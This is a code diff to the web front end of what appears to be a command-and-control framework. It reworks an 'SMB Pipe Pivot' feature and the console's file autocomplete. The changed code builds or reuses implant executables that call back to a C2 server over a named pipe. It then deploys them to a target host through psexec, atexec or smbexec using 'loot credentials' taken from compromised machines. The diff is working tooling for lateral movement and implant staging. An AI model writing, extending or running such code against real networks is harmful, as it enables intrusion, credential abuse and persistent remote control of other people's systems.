@@ -3281,36 +3281,58 @@ async function runCtxAction(act) {
         {v:'atexec',  l:'AtExec (Task Scheduler)'},
         {v:'smbexec', l:'SMBExec (in-memory)'},
       ];
+      // Load existing SMB pivot payloads for re-use
+      const artifactsR = await api('GET', '/api/artifacts');
+      const existingPivots = (artifactsR?.ok ? artifactsR.data||[] : [])
+        .filter(f => f.filename?.toLowerCase().endsWith('.exe'))
+        .map(f => ({v:f.filename, l:f.filename}));
+      const payloadOptions = [{v:'', l:'🆕 Build new (auto)'}, ...existingPivots];
+
       showQuickForm('🔗 SMB Pipe Pivot', [
-        {key:'host',   label:'Target host / IP', def:'', ph:'10.10.10.x'},
-        {key:'_cred',  label:'Loot credentials', type:'cred-pick'},
-        {key:'user',   label:'Username',          def:'', ph:'DOMAIN\\user'},
-        {key:'pass',   label:'Password',          type:'password', ph:''},
-        {key:'method', label:'Staging method',    type:'select', options:pivotMethods},
+        {key:'host',    label:'Target host / IP', def:'', ph:'10.10.10.x'},
+        {key:'_cred',   label:'Loot credentials', type:'cred-pick'},
+        {key:'user',    label:'Username',          def:'', ph:'DOMAIN\\user'},
+        {key:'pass',    label:'Password',          type:'password', ph:''},
+        {key:'method',  label:'Staging method',    type:'select', options:pivotMethods},
+        {key:'payload', label:'Payload (SMB pivot exe)', type:'select', options:payloadOptions},
       ], async vals => {
         if (!vals.host) { toast('Host required', 'red'); return; }
 
         // Generate unique pipe name so each pivot gets its own channel
         const pipeSuffix = Math.random().toString(16).slice(2, 8);
         const pipeName   = `svc_${pipeSuffix}`;
-        const pipeUNC    = `\\\\${parentIP}\\pipe\\${pipeName}`;
-        const outName    = `${pipeName}.exe`;
-        const c2host     = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(e) { return '127.0.0.1'; } })();
-        const serverURL  = `http://${c2host}:8080`;
+        // If user picked an existing payload, derive the pipe name from the filename stem.
+        // The payload was built with that pipe name baked in (e.g. svc_p2.exe → svc_p2).
+        let effectivePipeName = pipeName;
+        let effectiveOutName  = `${pipeName}.exe`;
+        const existingPayload = vals.payload;  // '' means build new
+        if (existingPayload) {
+          effectivePipeName = existingPayload.replace(/\.exe$/i, '');
+          effectiveOutName  = existingPayload;
+        }
+        const pipeUNC   = `\\\\${parentIP}\\pipe\\${effectivePipeName}`;
+        const c2host    = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(e) { return '127.0.0.1'; } })();
+        const serverURL = `http://${c2host}:8080`;
 
         openConsoleFor(aid);
-        addConsoleOutputForAgent(aid, `[smb-pivot] Building ${outName} → pipe:${pipeUNC}`, '', null);
-        addConsoleOutputForAgent(aid, `[smb-pivot] Starting pipe server on parent simultaneously…`, '', null);
 
-        // Step 1: build SMB exe + start pipe server on parent (in parallel)
-        const [buildR, pipeR] = await Promise.all([
-          api('POST', '/api/build', {
+        // Step 1: start pipe server + optionally build new payload (in parallel)
+        addConsoleOutputForAgent(aid, `[smb-pivot] Starting pipe server ${effectivePipeName} on parent…`, '', null);
+        let buildR = {ok:true};
+        if (!existingPayload) {
+          addConsoleOutputForAgent(aid, `[smb-pivot] Building ${effectiveOutName} → pipe:${pipeUNC}`, '', null);
+        }
+        const tasks = [api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:effectivePipeName})];
+        if (!existingPayload) {
+          tasks.push(api('POST', '/api/build', {
             format:'exe', transport:'smb',
             smb_pipe: pipeUNC, server_url: serverURL,
-            sleep_sec:5, jitter_pct:10, output_name: outName,
-          }),
-          api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:pipeName}),
-        ]);
+            sleep_sec:5, jitter_pct:10, output_name: effectiveOutName,
+          }));
+        }
+        const results = await Promise.all(tasks);
+        const pipeR = results[0];
+        if (!existingPayload) buildR = results[1];
 
         if (!pipeR?.ok) {
           addConsoleOutputForAgent(aid, '', `[smb-pivot] ✗ PIPE_START failed: ${pipeR?.error||'error'}`, null);
@@ -3323,7 +3345,7 @@ async function runCtxAction(act) {
           addConsoleOutputForAgent(aid, '', `[smb-pivot] ✗ Build failed: ${buildR?.error||'build error'}`, null);
           return;
         }
-        addConsoleOutputForAgent(aid, `[smb-pivot] ✓ Payload built: ${outName}`, '', null);
+        addConsoleOutputForAgent(aid, `[smb-pivot] ✓ Payload ready: ${effectiveOutName}`, '', null);
 
         // Step 2: wait for pipe server to start — must cover the parent's full sleep cycle
         const parentSleepSec = agnt?.sleep_sec || 60;
@@ -3340,10 +3362,10 @@ async function runCtxAction(act) {
 
         // Step 4: deploy payload to target via chosen staging method
         const method  = vals.method || 'psexec';
-        const cmdLine = `jump ${method} ${vals.host} ${outName} ${vals.user} ${vals.pass}`;
+        const cmdLine = `jump ${method} ${vals.host} ${effectiveOutName} ${vals.user} ${vals.pass}`;
         addConsoleOutputForAgent(aid, `[smb-pivot] Deploying → ${vals.host} via ${method}…`, '', null);
         dispatchConsoleCmd(aid, cmdLine);
-        toast(`SMB pivot launched → ${vals.host} | pipe:${pipeName}`, 'green');
+        toast(`SMB pivot launched → ${vals.host} | pipe:${effectivePipeName}`, 'green');
       });
       break;
     }
@@ -6641,17 +6663,20 @@ function consoleAcUpdate() {
       const parts = rest.trimStart().split(' ');
       if (parts.length >= 3) {
         const partial = parts[2];
-        const matches = acUploads.filter(f => {
-          if (!f.startsWith(partial) || f === partial) return false;
-          return f.toLowerCase().endsWith('.exe') || f.toLowerCase().endsWith('.dll');
-        });
-        if (matches.length) {
-          acMatches = matches.map(f => [val.slice(0, val.lastIndexOf(partial)) + f, f]);
+        const exeFilter = f => f.toLowerCase().endsWith('.exe') || f.toLowerCase().endsWith('.dll');
+        const uploadMatches  = acUploads.filter(f => f.startsWith(partial) && f !== partial && exeFilter(f));
+        const artifactMatches = acArtifacts.filter(f => f.startsWith(partial) && f !== partial && exeFilter(f) && !acUploads.includes(f));
+        const allMatches = [
+          ...uploadMatches.map(f => [f, 'upload']),
+          ...artifactMatches.map(f => [f, 'payload']),
+        ];
+        if (allMatches.length) {
+          acMatches = allMatches.map(([f]) => [val.slice(0, val.lastIndexOf(partial)) + f, f]);
           acIdx = -1;
           const ac = document.getElementById('console-ac');
-          ac.innerHTML = acMatches.slice(0, 15).map(([, f], i) =>
+          ac.innerHTML = allMatches.slice(0, 15).map(([f, type], i) =>
             `<div class="console-ac-item" data-idx="${i}" onmousedown="consoleAcPick(${i})">
-              <span class="ac-cmd">📄 ${esc(f)}</span><span class="ac-hint">upload</span>
+              <span class="ac-cmd">📄 ${esc(f)}</span><span class="ac-hint">${type}</span>
             </div>`
           ).join('');
           ac.classList.add('open');
